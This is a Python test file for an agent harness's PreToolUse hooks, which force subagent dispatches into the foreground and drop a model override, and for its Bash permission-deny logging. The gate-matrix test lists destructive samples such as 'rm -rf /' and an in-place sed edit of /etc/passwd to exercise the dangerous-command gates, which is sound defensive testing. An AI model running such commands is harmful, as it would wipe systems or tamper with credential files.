    Claude Code CLI's control channel invokes when a ``PreToolUse`` hook fires on a
    real ``Agent`` dispatch (`claude_agent_sdk/_internal/query.py`). This is NOT a
    direct call to the hook function: the hook is registered through the SDK's own
    ``_hooks_to_internal_format`` + the callback-id wiring ``Query.initialize()``
    performs, then invoked by the SDK via ``self.hook_callbacks[callback_id](...)``.

    Asserts: (a) the forwarded ``updatedInput`` has the ``model`` override dropped
    (so the dispatch inherits the 1M session model and the >200k base context fits,
    curing "Prompt is too long"), (b) NO ``permissionDecision`` is emitted (the
    rewrite is admission-neutral), and (c) the ``review_degraded`` audit marker
    fired on the hook path.
    """
    import json as _json

    from claude_agent_sdk._internal.query import Query
    from claude_agent_sdk.types import _hooks_to_internal_format

    config = _config_with_model("claude-opus-5[1m]")

    # Convert the pilot's real options.hooks via the SDK's own converter, exactly
    # as ClaudeSDKClient does before handing them to Query.
    internal_hooks = _hooks_to_internal_format(_build_pilot_pretooluse_hooks(config))

    query = Query(
        transport=_RecordingTransport(),
        is_streaming_mode=True,
        hooks=internal_hooks,
    )
    # Register the callback id(s) exactly as Query.initialize() does
    # (query.py: `self.hook_callbacks[callback_id] = callback`). We mirror that
    # loop rather than running the full initialize() handshake (which needs a
    # live transport round-trip); the INVOCATION path under test is unchanged.
    for _event, matchers in query.hooks.items():
        for matcher in matchers:
            for callback in matcher.get("hooks", []):
                cb_id = f"hook_{query.next_callback_id}"
                query.next_callback_id += 1
                query.hook_callbacks[cb_id] = callback
    assert query.hook_callbacks, "the pilot PreToolUse hook registered through the SDK"
    callback_id = next(iter(query.hook_callbacks))

    # The control request the CLI sends when the PreToolUse hook fires on a real
    # Agent dispatch forcing model: sonnet.
    control_request = {
        "type": "control_request",
        "request_id": "req-cpp257",
        "request": {
            "subtype": "hook_callback",
            "callback_id": callback_id,
            "input": {
                "hook_event_name": "PreToolUse",
                "tool_name": "Agent",
                "tool_input": {
                    "description": "Code reuse review",
                    "subagent_type": "general-purpose",
                    "model": "sonnet",
                    "prompt": "review this diff",
                },
                "tool_use_id": "toolu_cpp257",
                "session_id": "sess-cpp257",
                "transcript_path": "/tmp/transcript.jsonl",
                "cwd": "/tmp",
            },
            "tool_use_id": "toolu_cpp257",
        },
    }

    asyncio.run(query._handle_control_request(control_request))

    # The SDK wrote exactly one control_response carrying the hook output.
    assert len(query.transport.writes) == 1
    frame = _json.loads(query.transport.writes[0])
    assert frame["type"] == "control_response"
    assert frame["response"]["subtype"] == "success", frame
    hook_specific = frame["response"]["response"]["hookSpecificOutput"]
    assert hook_specific["hookEventName"] == "PreToolUse"

    updated = hook_specific["updatedInput"]
    assert "model" not in updated, "the forced small-window model override must be dropped"
    # Every other dispatch field is preserved.
    assert updated["subagent_type"] == "general-purpose"
    assert updated["description"] == "Code reuse review"
    assert updated["prompt"] == "review this diff"

    # Admission is UNCHANGED: the hook carries no permission decision.
    assert "permissionDecision" not in hook_specific
    assert "decision" not in frame["response"]["response"]

    # The audit marker fired on the hook path (cpp#257 observability).
    stderr = capsys.readouterr().err
    assert permissions_module.audit.AUDIT_TAG in stderr
    assert "agent_dispatch_model_inherit" in stderr
    assert "pre_tool_use_hook" in stderr


def test_cpp257_pre_tool_use_hook_leaves_larger_or_equal_override_untouched(
    capsys: pytest.CaptureFixture[str],
) -> None:
    """The reached hook does nothing (empty output, no admission touch, no audit)
    for a same-or-larger override — proving the MODEL rewrite is not a blanket
    Agent rewriter. The dispatch is already-foreground (``run_in_background:
    False``) so the cpp#267 force-foreground rewrite also no-ops, isolating the
    model axis: a truly untouched dispatch returns empty output."""
    import json as _json

    from claude_agent_sdk._internal.query import Query
    from claude_agent_sdk.types import _hooks_to_internal_format

    config = _config_with_model("claude-opus-5[1m]")
    internal_hooks = _hooks_to_internal_format(_build_pilot_pretooluse_hooks(config))
    query = Query(
        transport=_RecordingTransport(), is_streaming_mode=True, hooks=internal_hooks
    )
    for _event, matchers in query.hooks.items():
        for matcher in matchers:
            for callback in matcher.get("hooks", []):
                cb_id = f"hook_{query.next_callback_id}"
                query.next_callback_id += 1
                query.hook_callbacks[cb_id] = callback
    callback_id = next(iter(query.hook_callbacks))

    control_request = {
        "type": "control_request",
        "request_id": "req-cpp257b",
        "request": {
            "subtype": "hook_callback",
            "callback_id": callback_id,
            "input": {
                "hook_event_name": "PreToolUse",
                "tool_name": "Agent",
                # Same window as the session → not strictly smaller → model
                # untouched; already-foreground → cpp#267 also no-ops.
                "tool_input": {
                    "subagent_type": "general-purpose",
                    "model": "claude-opus-5[1m]",
                    "run_in_background": False,
                },
                "tool_use_id": "toolu_cpp257b",
                "session_id": "s",
                "transcript_path": "/tmp/t.jsonl",
                "cwd": "/tmp",
            },
            "tool_use_id": "toolu_cpp257b",
        },
    }
    asyncio.run(query._handle_control_request(control_request))

    frame = _json.loads(query.transport.writes[0])
    assert frame["response"]["subtype"] == "success"
    # Empty hook output → no updatedInput, no permission decision.
    assert frame["response"]["response"] == {}
    assert "agent_dispatch_model_inherit" not in capsys.readouterr().err


# ════════════════════════════════════════════════════════════════════════════
# cpp#267 (fix267b) — the PreToolUse Agent hook FORCES run_in_background=False.
#
# A detached background dispatch cannot outlive a headless session: a pilot that
# dispatches reviewers with `run_in_background: true` then yields its turn ends
# the session (SDK ResultMessage), and the background agents die with it — review
# lost, no PR, PIPELINE_INCOMPLETE (founding incident 624656b1). The same reached
# PreToolUse hook as cpp#257/263 now forces every dispatch foreground.
#
# WHY FORCE, NOT STRIP (cpp#269 was inoperant). The embedded CLI runs Agents in
# the background BY DEFAULT and gates foreground on `run_in_background !== false`.
# cpp#269 REMOVED the key — but an absent key requests the default = STILL
# BACKGROUND, so the lethality survived (2nd pilot bb9163e1 / mika#2627 died the
# same death after #269: strip fired, Agent returned in 11-26 ms, session ended
# "waiting on them"). The fix forces the key PRESENT and literally `False`.
#
# Prime requires rewrite ⊥ effect-verification: the REWRITE-test (the hook forces
# run_in_background=False) and the INVARIANT-test (no detached background task
# outlives the session) are SEPARATE, not the same assertion. The invariant is
# proven at the level that governs it — after the hook, every Agent dispatch the
# pilot forwards carries `run_in_background === false` — and reachability is
# proven through the SDK's OWN hook path (`Query._handle_control_request` with a
# `hook_callback` control request), NOT a direct call to the hook function.
# ════════════════════════════════════════════════════════════════════════════

from claude_pilot.permissions import _force_foreground_dispatch  # noqa: E402


def _dispatch_is_background(tool_input: dict) -> bool:
    """Model the embedded CLI's foreground gate: a dispatch runs in the
    BACKGROUND (so a detached task outlives a headless session end) unless
    ``run_in_background`` is literally ``False``. The CLI test is
    ``run_in_background !== false``, so an ABSENT key (the default) and any truthy
    value are both background; only literal ``False`` is foreground. This is the
    exact semantics cpp#269's strip (which left the key ABSENT) got wrong.
    """
    return tool_input.get("run_in_background") is not False


# ── REWRITE-test: the hook forces run_in_background=False (present, literal) ──


def test_cpp267_run_in_background_is_forced_false_when_truthy() -> None:
    """REWRITE-test (cpp#267/fix267b): a present-and-truthy ``run_in_background``
    is forced to literal ``False`` (PRESENT, not removed); every other dispatch
    field is preserved and the input is not mutated."""
    tool_input = {
        "description": "Code review",
        "subagent_type": "general-purpose",
        "run_in_background": True,
        "prompt": "review this diff",
    }
    rewritten = _force_foreground_dispatch(tool_input)
    assert rewritten is not None, "a truthy run_in_background must be forced False"
    # fix267b: the key is PRESENT and literally False — NOT stripped. Removing it
    # (cpp#269) requested the CLI background default and was inoperant.
    assert "run_in_background" in rewritten, "the key must stay PRESENT (not stripped)"
    assert rewritten["run_in_background"] is False
    assert rewritten["description"] == "Code review"
    assert rewritten["subagent_type"] == "general-purpose"
    assert rewritten["prompt"] == "review this diff"
    # The original is untouched (new dict returned).
    assert tool_input["run_in_background"] is True


def test_cpp267_absent_run_in_background_is_forced_false() -> None:
    """fix267b (vs cpp#269): an ABSENT ``run_in_background`` is background in the
    CLI (the default), so it MUST be rewritten to literal ``False`` — not left
    alone. This is exactly the case cpp#269's strip got wrong."""
    tool_input = {"description": "x", "subagent_type": "general-purpose"}
    rewritten = _force_foreground_dispatch(tool_input)
    assert rewritten is not None, "an absent key is the background default → force False"
    assert rewritten["run_in_background"] is False
    # also any non-False falsy value (None/0/"") is background → forced False
    assert _force_foreground_dispatch({"run_in_background": None})["run_in_background"] is False
    assert _force_foreground_dispatch({"run_in_background": 0})["run_in_background"] is False
    assert _force_foreground_dispatch({"run_in_background": ""})["run_in_background"] is False


def test_cpp267_already_false_is_noop() -> None:
    """Only a dispatch already literally ``False`` (already foreground) is left
    untouched — no rewrite, no audit churn."""
    assert _force_foreground_dispatch({"run_in_background": False}) is None


# ── AC3 (Prime's invariant, VU ROUGE): RED on #269's strip, GREEN on force-False ─


def test_cpp267_invariant_red_on_strip_green_on_force_false() -> None:
    """AC3 — Prime's invariant ``no background task survives session end in
    headless`` must FAIL on cpp#269's code and PASS after fix267b.

    The invariant is encoded by :func:`_dispatch_is_background`, which models the
    embedded CLI's ``run_in_background !== false`` foreground gate: anything other
    than literal ``False`` (absent OR truthy) runs in the background and so
    outlives a headless session.

    RED-before, simulated: cpp#269 STRIPPED the key (``pop``). We reproduce that
    exact pre-fix behavior on the founding-incident dispatch and show the
    invariant is VIOLATED — the stripped dispatch has an ABSENT key, which the CLI
    reads as the background default, so a detached task still outlives the
    session. GREEN-after: fix267b forces the key PRESENT and ``False``, and the
    invariant holds.
    """
    original = {
        "description": "ce-code-review reviewer",
        "subagent_type": "general-purpose",
        "run_in_background": True,
        "prompt": "review this diff",
    }

    # RED — simulate cpp#269's STRIP (remove the key). The pre-fix hook did
    # exactly `rewritten.pop("run_in_background", None)`.
    pre_fix_stripped = dict(original)
    pre_fix_stripped.pop("run_in_background", None)
    assert "run_in_background" not in pre_fix_stripped
    # The invariant FAILS on the strip: absent key == CLI background default, so
    # the detached task outlives the headless session. (This assertion is RED if
    # you (wrongly) expect the strip to have fixed the lethality.)
    assert _dispatch_is_background(pre_fix_stripped) is True, (
        "cpp#269 inoperant: stripping the key leaves it ABSENT == the CLI "
        "background default == the detached task still outlives the session"
    )

    # GREEN — fix267b FORCES the key present and literally False.
    post_fix = _force_foreground_dispatch(original)
    assert post_fix is not None
    assert post_fix["run_in_background"] is False
    assert _dispatch_is_background(post_fix) is False, (
        "fix267b: run_in_background === false is the one value the CLI gate "
        "accepts as foreground, so the dispatch no longer outlives the session"
    )


# ── INVARIANT-test: no background dispatch survives session end (SDK path) ────


def test_cpp267_invariant_no_background_dispatch_forwarded_via_sdk_control_request(
    capsys: pytest.CaptureFixture[str],
) -> None:
    """INVARIANT PROOF (cpp#267) — SEPARATE from the rewrite-test above.

    AC2 — the assertion is on CLI SEMANTICS, not key presence: the rewritten
    ``updatedInput`` carries ``run_in_background`` PRESENT and ``=== False`` —
    exactly the one value the embedded CLI's ``run_in_background !== false`` gate
    accepts as foreground. The behavioral contract is that, with this input, the
    Agent tool result returns only at the subagent's END (blocking); the
    input-level proof of that contract is ``run_in_background is False``. (cpp#269
    stripped the key, leaving it ABSENT == the CLI background default == still
    orphaned; fix267b forces it present and False.)

    The invariant that governs the lethality is: *in headless, no detached
    background task outlives the session*. Asserted at the level that governs it —
    after the reached PreToolUse hook, every ``Agent`` dispatch the pilot forwards
    runs foreground — so there is no detached task left in flight for session
    close to orphan.

    Reachability is proven through the SDK's OWN hook-dispatch entrypoint
    (``Query._handle_control_request`` with a ``hook_callback``
    ``SDKControlRequest``), exactly as the cpp#257 reachability test — NOT a
    direct call to the hook function (a direct green call attests the function,
    not the path the CLI actually drives).

    The session model is left UNKNOWN here so the model-inherit rewrite does not
    fire — this isolates the background-strip invariant from the model rewrite.
    """
    import json as _json

    from claude_agent_sdk._internal.query import Query
    from claude_agent_sdk.types import _hooks_to_internal_format

    # No model on the config → _maybe_inherit_session_model won't fire for a
    # no-model dispatch; the ONLY rewrite under test is the background strip.
    config = _config_with_model(None)
    internal_hooks = _hooks_to_internal_format(_build_pilot_pretooluse_hooks(config))
    query = Query(
        transport=_RecordingTransport(), is_streaming_mode=True, hooks=internal_hooks
    )
    for _event, matchers in query.hooks.items():
        for matcher in matchers:
            for callback in matcher.get("hooks", []):
                cb_id = f"hook_{query.next_callback_id}"
                query.next_callback_id += 1
                query.hook_callbacks[cb_id] = callback
    assert query.hook_callbacks, "the pilot PreToolUse hook registered through the SDK"
    callback_id = next(iter(query.hook_callbacks))

    # The founding incident shape: a reviewer dispatched in the background.
    control_request = {
        "type": "control_request",
        "request_id": "req-cpp267",
        "request": {
            "subtype": "hook_callback",
            "callback_id": callback_id,
            "input": {
                "hook_event_name": "PreToolUse",
                "tool_name": "Agent",
                "tool_input": {
                    "description": "ce-code-review reviewer",
                    "subagent_type": "general-purpose",
                    "run_in_background": True,
                    "prompt": "review this diff",
                },
                "tool_use_id": "toolu_cpp267",
                "session_id": "sess-cpp267",
                "transcript_path": "/tmp/transcript.jsonl",
                "cwd": "/tmp",
            },
            "tool_use_id": "toolu_cpp267",
        },
    }

    asyncio.run(query._handle_control_request(control_request))

    frame = _json.loads(query.transport.writes[0])
    assert frame["type"] == "control_response"
    assert frame["response"]["subtype"] == "success", frame
    hook_specific = frame["response"]["response"]["hookSpecificOutput"]
    assert hook_specific["hookEventName"] == "PreToolUse"

    updated = hook_specific["updatedInput"]
    # AC2 — CLI SEMANTICS, not key presence: run_in_background is PRESENT and
    # literally False (the one value the CLI's `!== false` gate reads as
    # foreground). cpp#269 stripped the key — absent == background default ==
    # inoperant — so a present-and-False assertion is exactly what distinguishes
    # the fix from the regression.
    assert "run_in_background" in updated, (
        "fix267b: the key must be PRESENT (cpp#269 stripped it, leaving the CLI "
        "background default in force)"
    )
    assert updated["run_in_background"] is False, (
        "the forwarded dispatch runs foreground (run_in_background === false) — "
        "a detached background task must not outlive a headless session; the "
        "behavioral contract is the Agent result returns only at subagent END"
    )
    # The modeled CLI gate agrees the dispatch is foreground.
    assert _dispatch_is_background(updated) is False
    # The dispatch still runs; only the detached/polled mode was removed.
    assert updated["subagent_type"] == "general-purpose"
    assert updated["description"] == "ce-code-review reviewer"
    assert updated["prompt"] == "review this diff"

    # Admission is UNCHANGED: the hook carries no permission decision.
    assert "permissionDecision" not in hook_specific
    assert "decision" not in frame["response"]["response"]

    # The rewrite is mechanically auditable (cpp#267 AC2 / Prime control (i)).
    stderr = capsys.readouterr().err
    assert permissions_module.audit.AUDIT_TAG in stderr
    assert "agent_dispatch_forced_foreground" in stderr
    assert "pre_tool_use_hook" in stderr


# ── COMBINED: model-inherit AND background-strip co-occur on one dispatch ─────


def test_cpp267_model_inherit_and_background_strip_combine_on_one_dispatch(
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Both cpp#263 (model inherit) and cpp#267/fix267b (force foreground) apply
    to ONE dispatch — the 624656b1 / bb9163e1 shape (forced sonnet +
    run_in_background on a 1M session). Driven through the SDK hook path; asserts
    the single forwarded ``updatedInput`` has BOTH the model override dropped AND
    run_in_background forced present-and-False, that BOTH audit events fired, and
    that no ``permissionDecision`` is added (cpp#263 model-inherit stays
    intact)."""
    import json as _json

    from claude_agent_sdk._internal.query import Query
    from claude_agent_sdk.types import _hooks_to_internal_format

    config = _config_with_model("claude-opus-5[1m]")
    internal_hooks = _hooks_to_internal_format(_build_pilot_pretooluse_hooks(config))
    query = Query(
        transport=_RecordingTransport(), is_streaming_mode=True, hooks=internal_hooks
    )
    for _event, matchers in query.hooks.items():
        for matcher in matchers:
            for callback in matcher.get("hooks", []):
                cb_id = f"hook_{query.next_callback_id}"
                query.next_callback_id += 1
                query.hook_callbacks[cb_id] = callback
    callback_id = next(iter(query.hook_callbacks))

    control_request = {
        "type": "control_request",
        "request_id": "req-cpp267c",
        "request": {
            "subtype": "hook_callback",
            "callback_id": callback_id,
            "input": {
                "hook_event_name": "PreToolUse",
                "tool_name": "Agent",
                "tool_input": {
                    "description": "Code reuse review",
                    "subagent_type": "general-purpose",
                    "model": "sonnet",  # strictly smaller window → cpp#263 rewrite
                    "run_in_background": True,  # headless-lethal → cpp#267 strip
                    "prompt": "review this diff",
                },
                "tool_use_id": "toolu_cpp267c",
                "session_id": "sess-cpp267c",
                "transcript_path": "/tmp/transcript.jsonl",
                "cwd": "/tmp",
            },
            "tool_use_id": "toolu_cpp267c",
        },
    }

    asyncio.run(query._handle_control_request(control_request))

    frame = _json.loads(query.transport.writes[0])
    assert frame["response"]["subtype"] == "success", frame
    hook_specific = frame["response"]["response"]["hookSpecificOutput"]
    updated = hook_specific["updatedInput"]
    # BOTH rewrites landed in the one forwarded input.
    assert "model" not in updated, "cpp#263: the smaller-window override must be dropped"
    assert updated["run_in_background"] is False, (
        "cpp#267/fix267b: run_in_background forced PRESENT and literally False "
        "(not stripped — an absent key is the CLI background default)"
    )
    assert _dispatch_is_background(updated) is False
    assert updated["subagent_type"] == "general-purpose"
    assert updated["description"] == "Code reuse review"
    assert updated["prompt"] == "review this diff"

    # No admission touch from either rewrite.
    assert "permissionDecision" not in hook_specific
    assert "decision" not in frame["response"]["response"]

    # BOTH audit events fired — each rewrite is independently auditable.
    stderr = capsys.readouterr().err
    assert "agent_dispatch_model_inherit" in stderr, "cpp#263 model-inherit audit intact"
    assert "agent_dispatch_forced_foreground" in stderr, "cpp#267 force-foreground audited"


# ────────────────────────────────────────────────────────────────────────────
# cpp#262 — `[policy:deny]` observability (OBSERVABILITY ONLY, no decision)
#
# The multi-line defect: the old deny line showed only the START of a script and
# never named which segment was refused; raw newlines meant `grep '[policy:deny]'`
# returned only line 1, and the rule_id + lethality suffix landed on a later,
# untagged physical line. A misleading log nearly signed cpp#256. These tests
# pin the fix: ONE physical line, the named segment + cause, a recoverable hash
# — and prove the gate matrix is byte-identical (only the log STRING changes).
# ────────────────────────────────────────────────────────────────────────────

_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")


def _plain(line: str) -> str:
    return _ANSI_RE.sub("", line)


def _chain_deny_policy(tmp_path: Path) -> Path:
    """`cd` is allow-listed; everything else default-denies — so a `cd …; make …`
    compound reaches the chain-veto / default-deny deny path."""
    p = tmp_path / "chain.yaml"
    p.write_text(
        "rules:\n"
        "  - id: bash-cd\n"
        "    tool: Bash\n"
        '    pattern: "^cd "\n'
        "    decision: allow\n"
        "    reason: cd\n"
        "default:\n"
        "  decision: deny\n"
        "  reason: no matching policy rule — denied by default\n"
    )
    return p


def test_262_multiline_deny_is_one_physical_line_naming_the_segment(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """AC1+AC2+AC4: a multi-line script whose faulty segment is line 3 renders as
    ONE physical line that NAMES the refused segment + cause and carries a hash
    of the full command."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd=str(worktree),
        guardrails=None,
        policy_path=_chain_deny_policy(tmp_path),
    )
    command = f"cd {worktree}\necho building\nmake build\ncargo run"
    result = asyncio.run(handler("Bash", {"command": command}, _mock_ctx()))
    assert isinstance(result, PermissionResultDeny)

    lines = _deny_lines(capsys.readouterr().err)
    assert len(lines) == 1, lines
    line = _plain(lines[0])
    # AC1 — ONE physical line: no raw newline survived into `detail`.
    assert "\n" not in line
    assert "⏎" in line, line
    # AC2 — the faulty segment (line 3) is named, with a cause and a count.
    assert 'segment="make build"' in line, line
    assert "cause=default-deny" in line, line
    assert "(1 of 2)" in line, line  # make build + cargo run both offend
    # AC4 — a recoverable hash of the FULL command.
    want = hashlib.sha256(command.encode()).hexdigest()[:12]
    assert f"sha256:{want}" in line, line
    # The prefix + lethality suffix (cpp#151) are preserved for dispatch-lib.
    assert "[policy:deny] Bash: " in line, line
    assert line.rstrip().endswith("(non-terminal)") or line.rstrip().endswith(
        "(terminal)"
    )


def test_262_truncation_shows_the_faulty_segment_preferentially(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """AC3: when the faulty segment falls OUTSIDE the 200-char window, it is shown
    preferentially over the (allow-listed) script start that would otherwise fill
    the window."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd=str(worktree),
        guardrails=None,
        policy_path=_chain_deny_policy(tmp_path),
    )
    # A long allow-listed `cd` prefix (> 200 chars) then the faulty `make` line.
    long_prefix = "cd " + ("a/" * 140)  # ~283 chars, allow-listed shape
    command = f"{long_prefix}\nmake build"
    result = asyncio.run(handler("Bash", {"command": command}, _mock_ctx()))
    assert isinstance(result, PermissionResultDeny)

    lines = _deny_lines(capsys.readouterr().err)
    assert len(lines) == 1, lines
    line = _plain(lines[0])
    assert 'segment="make build"' in line, line
    # The faulty segment is visible in the excerpt even though it sits past the
    # 200-char start-of-script window.
    assert "make build" in line.split("segment=")[0], line


def test_262_dest_veto_names_the_segment_and_cause(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """AC2: a destination veto names the write-capable segment and a dest-veto
    cause — not just the script start."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd=str(worktree),
        guardrails=None,
        policy_path=_BUNDLED_POLICY,
    )
    command = 'echo "go"\nmkdir -p /definitely/outside/x'
    result = asyncio.run(handler("Bash", {"command": command}, _mock_ctx()))
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is True

    lines = _deny_lines(capsys.readouterr().err)
    assert len(lines) == 1, lines
    line = _plain(lines[0])
    assert "\n" not in line
    assert 'segment="mkdir -p /definitely/outside/x"' in line, line
    assert "cause=dest-veto:" in line, line
    assert line.rstrip().endswith("(terminal)"), line


def test_262_diagnostic_does_not_change_the_gate_matrix(tmp_path: Path) -> None:
    """AC5: the gate matrix is byte-identical. The diagnostic re-walk is a pure
    read — running it leaves every gate predicate's verdict unchanged, and the
    predicates themselves return their known values over a broad sample."""
    from claude_pilot.tier1 import (
        is_tier1_auto_approve,
        is_tier3_dangerous,
        is_tier3_dangerous_for_lethality,
    )

    policy = permissions_module.load_policy(_BUNDLED_POLICY)
    cwd = str(tmp_path)

    sample = [
        "ls -la",
        "git status",
        "cd /x && make build",
        'echo "go"; mkdir -p /definitely/outside/x',
        "rm -rf /",
        "sed -i 's/a/b/' /etc/passwd",
        "cat f\nmake build\ncargo run",
        "env | grep -c MIKA",
        "mkdir -p /tmp/scratch",
        "grep -rn 'x' . | head",
        "for d in */; do echo $d; done",
        "git show HEAD:docs/x.md > docs/x.md",
    ]

    # Snapshot the four gate predicates before any diagnostic call.
    before = {
        c: (
            is_tier1_auto_approve("Bash", {"command": c}, cwd),
            is_tier3_dangerous(c),
            is_tier3_dangerous_for_lethality(c),
            permissions_module._denial_is_terminal("Bash", {"command": c}, cwd),
        )
        for c in sample
    }

    # Exercise the cpp#262 diagnostic on every sample (its only new work).
    for c in sample:
        permissions_module._diagnose_refused_bash(policy, c, cwd)
        permissions_module._command_hash(c)

    # Snapshot again — the diagnostic is read-only, so nothing moved.
    after = {
        c: (
            is_tier1_auto_approve("Bash", {"command": c}, cwd),
            is_tier3_dangerous(c),
            is_tier3_dangerous_for_lethality(c),
            permissions_module._denial_is_terminal("Bash", {"command": c}, cwd),
        )
        for c in sample
    }
    assert before == after

    # And a few anchor values, so a future edit that quietly changed a gate
    # (not just the log string) would fail here too.
    assert before["ls -la"][0] is True  # tier1 auto-approve
    assert before["rm -rf /"][1] is True  # tier3-dangerous
    assert before["rm -rf /"][3] is True  # terminal
    assert before["env | grep -c MIKA"][1] is False  # not dangerous


def test_262_hash_is_of_the_full_untruncated_command(tmp_path: Path) -> None:
    """AC4: the hash is over the FULL command, so a truncated line still rejoins
    the transcript regardless of the 200-char display window."""
    long_cmd = "cd x\n" + "echo " + ("z" * 500) + "\nmake build"
    got = permissions_module._command_hash(long_cmd)
    assert got == hashlib.sha256(long_cmd.encode()).hexdigest()[:12]
    assert len(got) == 12
